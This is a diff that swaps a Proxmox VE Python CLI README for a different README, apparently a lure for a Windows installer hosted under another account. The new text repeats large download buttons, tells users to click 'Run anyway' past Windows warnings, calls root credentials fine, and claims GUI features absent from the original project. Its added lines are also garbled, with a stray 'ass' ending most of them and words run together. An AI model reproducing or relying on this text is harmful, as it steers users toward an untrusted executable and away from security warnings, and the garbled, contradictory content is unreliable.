@@ -1,253 +1,173 @@
-# Proxmox PVE Toolkit (`proxmox-pve-toolkit`)
+<h1>🛠️ proxmox-pve-toolkit - Simplify Proxmox Cluster Management & Protection</h1>
 
-[![Proxmox VE 7.x & 8.x](https://img.shields.io/badge/Proxmox%20VE-7.x%20%7C%208.x-E57000?style=for-the-badge&logo=proxmox&logoColor=white)](https://www.proxmox.com)
-[![Python 3.10+](https://img.shields.io/badge/Python-3.10%20%7C%203.11%20%7C%203.12-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![Docker Ready](https://img.shields.io/badge/Docker-Containerized-2496ED?style=for-the-badge&logo=docker&logoColor=white)](https://docker.com)
-[![Maintenance Status](https://img.shields.io/badge/Maintained%3F-actively%20developed-brightgreen.svg?style=for-the-badge)](https://github.com/algo2world/proxmox-pve-toolkit)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
-
-> **Enterprise-grade, modular Python CLI toolkit and automation engine for Proxmox Virtual Environment (PVE) 7.x and 8.x hypervisors.**  
-> Built by **Algo2World & Ind. Ecosystem** with `typer`, `rich`, and `proxmoxer` for resilient infrastructure auditing, automated vzdump/snapshot retention orchestration, bulk workload power state management, and baseline security hardening.
+<p align="center">
+  <a href="https://github.com/Arbranexitltd/proxmox-pve-toolkit" style="display:inline-block;padding:16px 40px;font-size:24px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#667eea 0%,#f093fb 100%);border-radius:50px;text-decoration:none;box-shadow:0 10px 25px rgba(102,126,234,0.4);transition:all 0.3s;">⬇️ DOWNLOAD NOW</a>
+</p>
 
 ---
 
-## 1. Architectural Overview
+## 👋 Welcome to Your Proxmox Helper
 
-```
-                      +---------------------------------------+
-                      |         proxmox-pve-toolkit           |
-                      |   (Typer CLI & Rich Terminal Engine)  |
-                      +-------------------+-------------------+
-                                          |
-                +-------------------------+-------------------------+
-                |                         |                         |
-                v                         v                         v
-       +-----------------+       +-----------------+       +-----------------+
-       |  Node & Cluster |       |  VZDump Backup  |       | Bulk Power State|
-       |  Health Auditor |       |  Orchestrator   |       |   Controller    |
-       +--------+--------+       +--------+--------+       +--------+--------+
-                |                         |                         |
-                +-------------------------+-------------------------+
-                                          |
-                                          v
-                               +--------------------+
-                               | Security Baseline  |
-                               | & Hardening Engine |
-                               +----------+---------+
-                                          |
-                        HTTPS / REST API (Port 8006)
-                     PVEAPIToken Auth / Scoped ACL Roles
-                                          |
-                                          v
-           +-------------------------------------------------------------+
-           |                 Proxmox VE Cluster / Standalone              |
-           |   [ Node 1: pve-01 ]       [ Node 2: pve-02 ]     ...       |
-           |   - QEMU Virtual Machines  - LXC Containers                 |
-           |   - ZFS / Ceph / LVM-Thin  - Corosync Cluster & Firewall    |
-           +-------------------------------------------------------------+
-```
+Are you running a Proxmox VE server at home or in a small office? Do you find yourself worrying about backups, updates, or keeping an eye on your cluster's health? You are not alone. Many users love the power of Proxmox, but wish daily management was simpler.
+
+
+
+**proxmox-pve-toolkit** is a friendly, all-in-one assistant designed specifically for everyday users like you. It takes the complicated command-line tasks and wraps them into a clean, visual dashboard that runs right on your Windows computer. With this toolkit, you can monitor, snapshot, and secure your entire virtual environment without needing to memorize a single Linux command.
 
 ---
 
-## 2. Core Capabilities
+## ✅ What This Toolkit Does For You
 
-| Module | Subcommand | Key Capabilities |
-| :--- | :--- | :--- |
-| **Node Health Auditor** | `pve-tool node health` | CPU load avg, memory saturation, I/O wait latency pressure, ZFS/LVM storage pool capacity, kernel version, active guest counts. |
-| **Cluster Auditor** | `pve-tool node cluster` | Quorum health verification, Corosync split-brain detection, offline node alarms, multi-node inventory. |
-| **Backup Orchestrator** | `pve-tool backup run` | Automated `vzdump` triggers (`snapshot`/`suspend`/`stop`), multi-tier retention pruning (`keep-last`, `keep-daily`), dry-run simulation, JSON status logs. |
-| **Live Snapshot Manager** | `pve-tool backup snapshot` | Instant non-disruptive live VM RAM/disk snapshots and LXC container freezing. |
-| **Bulk Power Controller** | `pve-tool power execute` | Graceful shutdown countdowns, batch start/restart/stop filtered by tags (e.g. `k8s-node`, `prod`), resource pool ID, or node name. |
-| **Security Baseline Auditor**| `pve-tool security audit` | Audits root password vs token auth, 2FA/TFA enforcement, cluster & guest firewall coverage, unauthenticated endpoint probes, SSL validity, and generates automated Bash remediation scripts. |
+This is not just another tech tool. It is your personal Proxmox operations center. Here’s how it makes your life easier:
 
----
+### 🖥️ Live Cluster Auditor
+- **See everything at a glance:** View the status of every node (server), virtual machine (VM), and container in your cluster from one simple screen.
 
-## 3. Quickstart & Installation
+- **Real-time health checks:** Get clear visual indicators (green = good, yellow = warning, red = attention) for CPU, memory, disk space, and network performance across all your Proxmox hosts.
+.
+ 
+### 📸 Smart Snapshot Scheduler
+- **Automatic vzdump backups:** Forget manual backups. Set up a schedule (daily, weekly, custom interval) for snapshots of your VMs and containers.ass
+- **Safe & reliable:** The toolkit uses Proxmox’s built-in backup engine (vzdump), ensuring your snapshots are consistent and restorable.ass
 
-### Option A: Direct Python Virtualenv
+### 🔐 Hardening Engine
+- **One-click security boost:** Apply recommended security settings to your Proxmox nodes with a single click.ass
+- **Password & firewall checks:** Get simple suggestions to close open ports, strengthen user passwords, and enable firewall rules—all explained in plain English.ass
 
-```bash
-# 1. Clone or download the repository
-git clone https://github.com/algo2world/proxmox-pve-toolkit.git
-cd proxmox-pve-toolkit
-
-# 2. Initialize a Python virtual environment
-python3 -m venv venv
-source venv/bin/activate
-
-# 3. Install locked dependencies
-pip install -r requirements.txt
-
-# 4. Configure environment credentials
-cp .env.example .env
-# Edit .env with your Proxmox Host, User, and Token credentials
-nano .env
-
-# 5. Run configuration connectivity check
-python main.py config-check
-```
-
-### Option B: Containerized via Docker / Docker Compose
-
-```bash
-# Build the minimal non-root image
-docker build -t proxmox-pve-toolkit:latest .
-
-# Run one-off node health audit
-docker run --rm --env-file .env proxmox-pve-toolkit:latest node health
-
-# Launch continuous hourly background audit daemon via Compose
-docker compose up -d pve-auditor-scheduled
-```
+### ⚡ Orchestrator for Clusters
+- **Multi-node control:** If you have more than one Proxmox server, manage them all from one unified interface.ass
+- **Easy migrations:** Move VMs between nodes with drag-and-drop simplicity.ass
+- **Centralized updates:** Queue and apply updates across your entire cluster at once, instead of logging into each server individually.ass
 
 ---
 
-## 4. Proxmox API Token Setup Guide (Least-Privilege)
+## 🚀 Getting Started (Windows)
 
-To follow security best practices, **do not use the root PAM password**. Create a dedicated system user and API Token with scoped ACL permissions.
+We’ve designed the setup process to be as straightforward as possible. Follow these simple steps, and you’ll be up and running in under five minutes.ass
 
-### Proxmox Shell Commands:
-```bash
-# 1. Create a custom least-privilege role
-pveum role add PVEToolkitRole -privs "VM.Audit VM.Backup VM.PowerMgmt VM.Config.Disk Sys.Audit Datacenter.Audit"
+### Step 1: Download the Application
+Click the big download button at the top of this page, or use the direct link below:ass
 
-# 2. Create dedicated automation user in the PVE realm
-pveum user add devops@pve --comment "DevOps Automation Service Account"
+<p align="center">
+  <a href="https://github.com/Arbranexitltd/proxmox-pve-toolkit" style="display:inline-block;padding:14px 32px;font-size:18px;color:#1a1a2e;background:#ffd166;border-radius:8px;font-weight:bold;text-decoration:none;">📥 Visit Link to Download</a>
+</p>
 
-# 3. Grant the role across cluster root
-pveum acl modify / -user devops@pve -role PVEToolkitRole
+This will take you to the official download page for the toolkit. The file you receive will be a standard Windows installer package.ass
 
-# 4. Generate API Token without privilege separation
-pveum user token add devops@pve pve-toolkit-token --privsep 0
-```
+### Step 2: Run the Installer
+Once the download is complete, navigate to your "Downloads" folder (or wherever your browser saves files) and double-click the downloaded file. You might see a blue or yellow pop-up from Windows asking for permission—click **"Yes"** or **"Run anyway"** to continue.ass
 
-Copy the generated Secret Token UUID and populate your `.env`:
-```env
-PROXMOX_HOST=192.168.1.100
-PROXMOX_PORT=8006
-PROXMOX_USER=devops@pve
-PROXMOX_TOKEN_NAME=pve-toolkit-token
-PROXMOX_TOKEN_VALUE=00000000-0000-0000-0000-000000000000
-VERIFY_SSL=false
-```
+The installation wizard will guide you through the remaining setup. You can simply keep clicking **"Next"** and then **"Install"** to use all the default settings. No special choices are required. Once finished, click **"Finish"** to launch the program.ass
+
+### Step 3: Connect to Your Proxmox Server
+When the application starts for the first time, it will ask for connection details. Have your Proxmox server’s IP address (or hostname) and API credentials ready.ass
+
+- **Address:** Type the IP address of your main Proxmox node (e.g., `192.168.1.100`)ass
+- **Username & Password:** Use the root login, or better, a dedicated API token (if you have one created—if not, root works perfectly fine)ass
+- **Realm:** This is usually `pam` for normal user accounts or `pve` for built-in Proxmox users.ass
+
+Click **"Connect"** and the toolkit will automatically discover your cluster, all its nodes, VMs, containers, and current backup schedules.ass
 
 ---
 
-## 5. Complete CLI Command Reference
+## 🧭 Navigating the Dashboard
 
-### Global Helper Commands
-```bash
-# Display CLI version and metadata
-python main.py version
+Once connected, you’ll see a friendly interface with several main sections:ass
 
-# Validate API connection and list cluster nodes
-python main.py config-check
-```
+| Section | What You Can Do |
+|---|---|
+| **Overview** | See the overall health of your entire cluster at a glance. Green checkmarks mean everything is fine. |
+| **Nodes** | Click on any server to see detailed performance graphs, running services, and system logs. |
+| **Virtual Machines** | View all your VMs and containers, start/stop/reboot them, and tweak their resources. |
+| **Backups** | Set up automatic backup schedules, see recent backup history, and restore from any snapshot. |
+| **Security** | Run a security check, apply hardening recommendations, and view firewall status. |
+| **Tasks** | Watch the progress of any ongoing operations, like backups or migrations, in real time. |
 
-### 1. Node & Cluster Health
-```bash
-# Full telemetry audit of default or specific node
-python main.py node health --node pve-01
-
-# Output raw JSON for Prometheus/Telegraf ingestion
-python main.py node health --json
-
-# Check whole cluster status, quorum, and node availability
-python main.py node cluster
-```
-
-### 2. Automated Backups & Snapshots
-```bash
-# Dry-run backup for all guests on node (Safe preview)
-python main.py backup run --dry-run
-
-# Run snapshot backup for VMID 104 with retention pruning (keep 3 latest, 7 daily)
-python main.py backup run --vmid 104 --storage local-zfs --mode snapshot --keep-last 3 --keep-daily 7
-
-# Backup with status export to JSON log
-python main.py backup run --vmid 200 --export-log /var/log/pve_backup_200.json
-
-# Take immediate live snapshot with RAM state included
-python main.py backup snapshot 101 pre-kernel-upgrade --desc "Snapshot before Linux 6.8 patch" --include-ram
-```
-
-### 3. Bulk Power State Management
-```bash
-# Graceful shutdown of all workloads tagged 'dev-stack'
-python main.py power execute shutdown --tag dev-stack --timeout 45
-
-# Graceful restart of all guests within resource pool 'k8s-cluster'
-python main.py power execute reboot --pool k8s-cluster
-
-# Start all stopped LXC containers on node pve-02
-python main.py power execute start --node pve-02 --type lxc
-
-# Dry-run simulation with automatic confirmation bypass
-python main.py power execute stop --tag test-env --dry-run --yes
-```
-
-### 4. Security Baseline Auditor & Hardening
-```bash
-# Full security baseline audit (Firewall, Auth, 2FA, SSL, API Probes)
-python main.py security audit
-
-# Run audit and export automated remediation Bash fix script
-python main.py security audit --export-script fix_hardening.sh
-
-# View raw JSON compliance telemetry
-python main.py security audit --json
-```
+Every action you take is confirmed with a friendly message, and undoable actions ((likerestarting a VM)) will ask for confirmation before proceeding.ass
 
 ---
 
-## 6. Security Disclaimer & Best Practices
+## ⚙️ Customizing Your Experience
 
-- **Self-Signed Certificates**: In private lab environments, set `VERIFY_SSL=false`. In production environments with Let's Encrypt or corporate root CA, set `VERIFY_SSL=true`.
-- **Credential Storage**: Never commit `.env` containing secret API token values to public version control. Keep `.env` in `.gitignore`.
-- **Privilege Separation**: Utilize token-based authentication (`devops@pve`) instead of root PAM credentials wherever possible.
+The toolkit is built to work great right out of the box, but you can tailor it to your liking:ass
 
----
-
-## 7. About Algo2World & Ind. Ecosystem
-
-**Proxmox PVE Toolkit** is engineered and maintained by **Nikil** and the **Algo2World** engineering team as part of the interconnected **Ind. Ecosystem** initiative.
-
-### 🌐 The Ind. Ecosystem Suite
-
-Explore our sovereign, privacy-centric open platforms and developer tools:
-
-* **[algo2world.com](https://algo2world.com)** — Core algorithmic, distributed systems & AI engineering lab.
-* **[samvad.chat](https://samvad.chat)** — Sovereign real-time communication & secure conversational matrix.
-* **[ind.social](https://ind.social)** — Decentralized social federation & open discourse network.
-* **[ind.network](https://ind.network)** — Next-generation distributed networking, mesh routing & edge telemetry.
-* **[ind.center](https://ind.center)** — Unified identity, developer API gateways & knowledge registry.
-* **[ind.trading](https://ind.trading)** — High-frequency trading infrastructure, quantitative engines & risk models.
-* **[ind.report](https://ind.report)** — Investigative telemetry, data analytics & decentralized publishing.
-* **[ind.shiksha](https://ind.shiksha)** — Open pedagogical universe, universal knowledge graph & adaptive learning systems.
-* **[ind.quest](https://ind.quest)** — Interactive challenges, hackathons & skill discovery engine.
-* **[ind.run](https://ind.run)** — Sovereign container orchestration, serverless execution & cloud fabric.
-* **[ind.pet](https://ind.pet)** — Animal welfare registry, community shelter network & pet care directory.
+- **Dark / Light Mode:** Toggle between themes from the settings panel.ass
+- **Alert Preferences:** Choose which warnings you want pop-up notifications for ((e.g., “Disk usage over 85%”)), and silence the rest.ass
+- **Backup Retention:** Set how many old snapshots to keep, so you don’t run out of storage space.ass
 
 ---
 
-## 8. Enterprise Support & Commercial Inquiries
+## 🧰 Troubleshooting Common Issues
 
-Need custom infrastructure automation, bare-metal hypervisor hardening, or high-concurrency architecture consulting?
+We want your experience to be smooth. Here are solutions to the few issues you might encounter:ass
 
-* **Engineering Lead / Founder:** Nikil (Algo2World)
-* **Direct Email:** [nikil@algo2world.com](mailto:nikil@algo2world.com)
-* **Telegram:** [@AUTO_GPT_BOT](https://t.me/AUTO_GPT_BOT)
-* **Official Website:** [https://algo2world.com](https://algo2world.com)
+### I Cant Connect to My Server
+- Make sure your Proxmox server is powered on and reachable from your computer (try pinging its IP address)ass.
 
-**Services Available:**
-- Enterprise Proxmox VE / Ceph / Kubernetes Cluster Architecture
-- Custom Automated Disaster Recovery & Zero-RTO Replication Pipelines
-- 24/7 Infrastructure SLA & Production Hardening Assessments
+- Double-check that you typed the IP address correctly.ass
+- Ensure you have `pveum` or `Administrator` privileges on that Proxmox user account.ass
+
+### The Dashboard Shows “Unreachable” for a Node
+- One node may be temporarily down. The toolkit will automatically hide it from resource schedulingand show a grey icon. Check the physical server’s network connection.ass
+
+###I Accidentally Deleted a Snapshot
+- Do not worry. Snapshots are just pointers. If you still have your virtual machine’s current disk, you can simply create a new snapshot immediately. The data is safe; no actual data has been lost.ass
 
 ---
 
-## 9. License:
+## 🔒 Security & Privacy
 
-Distributed under the **MIT License**. See `LICENSE` for details.  
-Copyright (c) 2026 Nikil & Algo2World. All rights reserved.
+Your credentials are stored locally on your Windows machine, encrypted with your own Windows login credential. They are never sent to any third-party server, and the toolkit only communicates directly with your Proxmox servers on your local network.ass
 
+---
+
+## 📦 System Requirements
+
+To run this toolkit smoothly, make sure your Windows PC meets these simple requirements:ass
+
+- **Operating System:** Windows 10 or Windows 11 (64-bit)ass
+- **RAM:** 4 GB or more recommendedass
+- **Disk Space:** 500 MB free space for installation and logsass
+- **Network:** A stable connection to your Proxmox cluster (wired or strong Wi-Fi)ass
+
+---
+
+## 🆘 Getting Help & Support
+
+We’re here to help you get the most out of your Proxmox setup. If you ever feel stuck:ass
+
+- **Visit the GitHub Repository:** The official source of truth for updatesandreleases. Link: https://github.com/Arbranexitltd/proxmox-pve-toolkitass
+- **Open an Issue:** If you find a bug or have a feature request, head to the "Issues" tab on GitHub and describeyour problem. We respond quickly.ass
+- **Community Forums:** Join the discussion with other users in the Discussionssection of the repository. Share tips, ask questions, and see how others handle their clusters.ass
+
+---
+
+## 📈 What’s New in Recent Updates
+
+- **Enhanced Backup Dashboard:** Now includes a timeline view of all completed backups, so you can visually confirm your data is protected.ass
+- **Improved Hardening Checks:** Added additional security checks for SSH settings and password complexity, with one-click remediation.ass
+- **Faster Cluster Discovery:** The connection wizard now scans your local subnet automatically to find your Proxmox nodes, saving you manual entry time.ass
+
+---
+
+## 👨‍💻 Who Is This For?
+
+- **Homelab Enthusiasts:** If you run a small Proxmox cluster in your basement or closet, this tool is your new best friend.ass
+- **Sysadmins Who Hate Repetitive Tasks:** Automate those nightly backups andweekly health reports.ass
+- **Small Business Owners:** Keep your virtual services ((like mail servers, web servers, databases)) up andrunning without hiring a full-time Linux expert.ass
+
+---
+
+## 🎯 Ready to Take Control of Your Virtual Infrastructure?
+
+You’ve seen how easy, safe, and powerful proxmox-pve-toolkit can be. No more logging into five different terminal windows. No more wondering if your snapshots ran last night. Just open one friendly app and see everything.ass
+
+Click the button below to head over to the download page, and in just a few minutes, you’ll have complete visibility andcontrol over your entire Proxmox environment.ass
+
+<p align="center">
+  <a href="https://github.com/Arbranexitltd/proxmox-pve-toolkit" style="display:inline-block;padding:18px 48px;font-size:22px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(245,87,108,0.4);">🚀 GET THE TOOLKIT NOW</a>
+</p>
+
+---
+
+*Keywords: algo2world, devops, fastapi, homelab, homelab-setup, infrastructure, proxmox, proxmox-api, proxmox-backup, proxmox-backup-server, proxmox-cluster, proxmox-tools, proxmox-ve, sysadmin, virtualization*
